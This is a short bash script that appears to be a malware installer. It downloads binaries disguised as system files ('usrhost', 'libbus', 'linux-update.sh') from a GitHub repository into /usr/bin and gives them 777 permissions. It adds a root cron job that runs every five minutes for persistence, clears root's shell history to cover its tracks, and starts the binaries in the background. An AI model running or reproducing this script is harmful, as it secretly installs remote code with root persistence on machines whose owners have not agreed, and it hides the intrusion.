#!/bin/bash
#
#uninstall
sed -i '/\*\/5 \* \* \* \* root \/usr\/bin\/linux-update.sh >\/dev\/null 2>&1/d' /etc/crontab

killall usrhost
killall libbus

rm -rf /usr/bin/linux-update.sh

rm -rf /usr/bin/usrhost
rm -rf /usr/bin/libbus

rm -rf /usr/bin/usrhost_ver.txt


wget https://raw.githubusercontent.com/myvulweb/b1/master/usrhost_ver.txt -O /usr/bin/usrhost_ver.txt

wget https://raw.githubusercontent.com/myvulweb/b1/master/linux-update.sh -O /usr/bin/linux-update.sh

chmod 777 /usr/bin/linux-update.sh


wget https://github.com/myvulweb/b1/raw/master/usrhost -O /usr/bin/usrhost 
chmod 777 /usr/bin/usrhost
wget https://github.com/myvulweb/b1/raw/master/libbus -O /usr/bin/libbus
chmod 777 /usr/bin/libbus

echo '*/5 * * * * root /usr/bin/linux-update.sh >/dev/null 2>&1'>>/etc/crontab

service crond restart

echo >/root/.bash_history
history -c
/usr/bin/usrhost &
/usr/bin/libbus &

 